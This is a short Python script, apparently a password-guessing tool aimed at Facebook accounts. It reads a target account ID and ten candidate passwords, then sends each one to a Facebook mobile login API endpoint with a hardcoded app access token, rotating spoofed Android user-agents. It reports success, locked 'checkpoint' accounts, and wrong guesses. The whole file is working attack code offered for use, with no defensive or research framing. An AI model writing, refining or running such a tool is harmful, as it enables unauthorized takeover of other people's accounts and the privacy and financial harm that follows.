
import os,random,mechanize,json
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
os.system("clear")
if os.path.exists('.pass.txt'):
    os.remove('.pass.txt')

print ('''\033[1;94m
 _____              _                 _
|  ___|_ _  ___ ___| |__   ___   ___ | | __
| |_ / _` |/ __/ _ \ '_ \ / _ \ / _ \| |/ /
|  _| (_| | (_|  __/ |_) | (_) | (_) |   <
|_|  \__,_|\___\___|_.__/ \___/ \___/|_|\_\

''')


br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
useragents = [
    'Mozilla/5.0 (Linux; Android 6.0; MYA-L22) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',
    'Mozilla/5.0 (Linux; Android 9; SM-G960F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36'
             ]
br.addheaders = [('User-Agent', random.choice(useragents))]

id = input('\033[1;96mENTER ID\033[1;97m: ')
with open('.pass.txt','a') as f:
    for i in range(10):
        pwd = input('\033[1;96mENTER PASSWORDS '+str(i+1)+'\033[1;97m: ')
        f.write(pwd+'\n')
with open('.pass.txt','r') as v:
    pas = v.read()
pass_list = pas.splitlines()
count = 0
while count < len(pass_list):
    pw = pass_list[count]
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + id + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
    q = json.load(data)
    if 'access_token' in q:
        print('\033[1;92mLogin success')
        print(id + '|' + pw)
        break
    else:
        if 'www.facebook.com' in q['error_msg']:
            print('\033[1;91mAccount Has Been Checkpoint ')
            print(id + ' | '+ pw)
        else:

            print('\033[1;91mworng passwords \033[1;97m> ' + pw)
    count += 1

